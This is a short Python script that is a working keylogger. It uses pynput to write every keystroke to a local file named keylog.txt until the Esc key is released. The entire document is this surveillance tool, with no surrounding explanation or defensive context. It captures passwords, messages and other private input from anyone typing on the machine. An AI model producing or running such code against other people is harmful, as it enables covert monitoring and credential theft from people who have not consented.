from pynput.keyboard import Listener, Key

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key}\n")
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == Key.esc:
        return False  # Stop listener

# Collect events until released
try:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except Exception as e:
    print(f"Listener error: {e}")
